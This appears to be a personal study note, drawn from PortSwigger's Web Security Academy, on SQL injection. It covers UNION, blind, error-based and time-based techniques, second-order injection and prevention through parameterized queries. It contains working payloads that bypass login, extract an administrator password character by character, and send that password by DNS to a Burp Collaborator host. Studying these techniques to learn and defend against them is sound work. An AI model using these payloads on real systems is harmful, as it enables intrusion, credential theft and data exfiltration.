>[!info] SQL injection
>- Web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
>- [Cheat-Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
----
>[!tip] Spot SQL injection vulnerabilities
>- Submit the single quote character `'`. 
>- Boolean conditions such as `OR 1=1` and `OR 1=2`.
>- Trigger time delays when executed within a SQL query.
>- OAST payloads designed to trigger an out-of-band network interaction.
>
>>[!tip] Common locations where SQLi arises
>>- In `UPDATE` statements, within the updated values or the `WHERE` clause.
>>- In `INSERT` statements, within the inserted values.
>>- In `SELECT` statements, within the table or column name.
>>- In `SELECT` statements, within the `ORDER BY` clause.
---
>[!danger] Retrieving hidden data
>- Imagine this URL:
>```
>https://insecure-website.com/products?category=Gifts
>```
>- This causes the application to make this SQL query:
>```sql
>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
>```
>- The restriction `released = 1` is being used to hide products that are not released.
>- We could assume for unreleased products, `released = 0`.
>- In this case we could submit the single quote character `'` to open the query and then add the comment indicator `--` to drop the rest of the query, like this:
>```
>https://insecure-website.com/products?category=Gifts'--
>```
>- The query will look like this:
>```sql
>SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
>```
>- You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:
>```
>https://insecure-website.com/products?category=Gifts'+OR+1=1--
>```
>- The query will looks like this:
>```sql
>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
>```
>
>>[!warning]
>>- Take care when injecting the condition `OR 1=1` into a SQL query.
>>- If your condition reaches an `UPDATE` or `DELETE` statement it can result in an accidental loss of data.
---
>[!danger] Subverting application logic
>- Imagine an application that checks the credentials by performing the following SQL query:
>```sql
>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
>```
>- In this case, an attacker can log in as any user without the need for a password:
>```sql
>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
>```
---
>[!danger] SQL injection UNION attacks
>- When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database.
>
>>[!info] UNION Query
>>- Enables you to execute one or more additional `SELECT` queries and append the results to the original query:
>>```sql
>>SELECT a, b FROM table1 UNION SELECT c, d FROM table2
>>```
>>- For a `UNION` query to work, two key requirements must be met:
>>1. The individual queries must return the same number of columns.
>>2. The data types in each column must be compatible between the individual queries.
>- To carry out a SQL injection UNION attack you normally need to find out:
>
>>[!tip] The number of columns required
>>- There are two effective methods to determine how many columns are being returned from the original query:
>> 
>>>[!bug] ORDER BY
>>>- Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs:
>>>```sql
>>>' ORDER BY 1-- 
>>>' ORDER BY 2-- 
>>>' ORDER BY 3-- 
>>>etc.
>>>```
>>
>>>[!bug] NULL
>>>- Submitting a series of `UNION SELECT` payloads specifying a different number of null values until an error occurs: 
>>> ```sql
>>> ' UNION SELECT NULL-- 
>>> ' UNION SELECT NULL,NULL-- 
>>> ' UNION SELECT NULL,NULL,NULL-- 
>>> etc.
>>>```
>>>  
>>>>[!info] Database-specific syntax
>>>>- On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table.
>>>>- There is a built-in table on Oracle called `dual` which can be used for this purpose:
>>>>```sql
>>>>' UNION SELECT NULL FROM DUAL--
>>>>```
>>>>- On Oracle, you can also use the concatenation operator `||` to retrieve multiple values together from  a single column:
>>>>```sql
>>>>' UNION SELECT username || '~' || password FROM users--
>>>>```
>>>>- On MySQL, the double-dash sequence must be followed by a space `-- `.
>>>>- Alternatively, the hash character `#` can be used to identify a comment.
>
>>[!tip] Finding columns with a compatible data type
>>- The data that you want to retrieve is normally in string form.
>>- This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data:
>>```sql
>>' UNION SELECT 'a',NULL,NULL,NULL-- 
>>' UNION SELECT NULL,'a',NULL,NULL-- 
>>' UNION SELECT NULL,NULL,'a',NULL-- 
>>' UNION SELECT NULL,NULL,NULL,'a'-- 
>>```
---
>[!info] Examining the database
>
>>[!example] Database type & Version
>>- Microsoft, MySQL:`SELECT @@version`
>>- Oracle:`SELECT * FROM v$version`
>>- PostgreSQL:`SELECT version()`
>
>>[!example] The information schema
>>- To list the tables in the database:
>>```sql
>>SELECT * FROM information_schema.tables
>>```
>>- You can then query `information_schema.columns` to list the columns in individual tables:
>>```sql
>>SELECT * FROM information_schema.columns WHERE table_name = 'Users'
>>```
---
>[!danger] Blind SQL Injection
>
>>[!bug] Triggering conditional responses
>>- Consider an application that uses tracking cookies to gather analytics about usage:
>>```
>>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
>>```
>>- When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:
>>```sql
>>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
>>```
>>- This is where the conditional responses come in to play:
>>```sql
>>…xyz' AND '1'='1
>>…xyz' AND '1'='2
>>```
>>- The first query will display a "Welcome" message, while the second query won't display anything.
>>- This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
>>
>>>[!example]
>>>- Suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`.
>>>- You can determine the password for this user by sending a series of inputs to test the password one character at a time.
>>>```sql
>>>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
>>>```
>>>- This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
>>>- Next, we send the following input:
>>>```sql
>>>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
>>>```
>>>- This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
>>>- Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:
>>>```sql
>>>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
>>>```
>>>
>>>>[!info]
>>>>- The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.
>
>>[!tip] Error-based
>>- Refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.
>>
>>>[!bug] Triggering conditional errors
>>>- Some application's behaviour doesn't change, regardless of whether the query returns any data.
>>>  
>>> >[!example]
>>>>- Suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
>>>>```sql
>>>>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
>>>>```
>>>>- These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:
>>>>1. With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
>>>>2. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.
>>>>- If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
>>>>- Using this technique, you can retrieve data by testing one character at a time:
>>>>```sql
>>>>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
>>>>```
>>
>>>[!bug] Verbose SQL error messages
>>>- Consider the following error message, which occurs after injecting a single quote into an `id` parameter:
>>>```sql
>>>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
>>>```
>>>- We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. 
>>>- Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.
>>>- Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query.
>>>- You can use the `CAST()` function to achieve this.
>>> 
>>>>[!info] CAST()
>>>>- It enables you to convert one data type to another.
>>>
>>>>[!example]
>>>>- Imagine a query containing the following statement:
>>>>```sql
>>>>CAST((SELECT example_column FROM example_table) AS int)
>>>>```
>>>>- Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:
>>>>```
>>>>ERROR: invalid input syntax for type integer: "Example data"
>>>>```
>>>>- This type of query may also be useful if a character limit prevents you from triggering conditional responses.
>
>>[!bug] Triggering Time Delays
>>- As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response.
>>- This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
>>- The techniques for triggering a time delay are specific to the type of database being used.
>>
>>>[!example]
>>>- On Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
>>>```sql
>>>'; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'--
>>>```
>>>- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
>>>- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.
>>>- Using this technique, we can retrieve data by testing one character at a time: 
>>>```sql
>>>'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
>>>```
>
>>[!bug] Out-Of-Band (OAST) Techniques
>>- Sometimes the application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
>>- In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control.
>>- These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
>>- A variety of network protocols can be used for this purpose, but typically the most effective is `DNS`.
>>
>>>[!example]
>>>- Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application:
>>>```sql
>>>'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
>>>```
>>>- This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup.
>>>- This lookup allows you to view the captured password:
>>>```
>>>S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
>>>```
>>-  `OAST` techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. 
>>- `OAST` techniques are often preferable even in situations where other techniques for blind exploitation do work.
---
>[!tip] SQL injection in different contexts
>- You can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application.
>- Some websites take input in `JSON` or `XML` format and use this to query the database.
>- These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms.
>
>>[!example] 
>>- The following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:
>>```html
>><stockCheck> <productId>123</productId> <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>
>>```
>>- This will be decoded server-side before being passed to the SQL interpreter.
---
>[!info] Second-order SQL injection
>- Occurs when the application takes user input from an HTTP request and stores it for future use.
>- This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored.
>- Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.
>- Second-order SQL injection often occurs in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database.
>- When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely.
---
>[!warning] How to prevent SQL injection
>- You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query.
>- These parameterized queries are also know as "prepared statements".
>
>>[!example]
>>- The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:
>>```sql
>>String query = "SELECT * FROM products WHERE category = '"+ input + "'"; Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(query);
>>```
>>- You can rewrite this code in a way that prevents the user input from interfering with the query structure:
>>```sql
>>PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?"); statement.setString(1, input); ResultSet resultSet = statement.executeQuery();
>>```
>- You can use parameterized queries for any situation where untrusted input appears as data within the query, including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement.
>- They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the `ORDER BY` clause.
>- Application functionality that places untrusted data into these parts of the query needs to take a different approach, such as:
>1. Whitelisting permitted input values.
>2. Using different logic to deliver the required behavior.
>- For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant.
>- It must never contain any variable data from any origin.
>- Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe.
>- It's easy to make mistakes about the possible origin of data, or for changes in other code to taint trusted data.
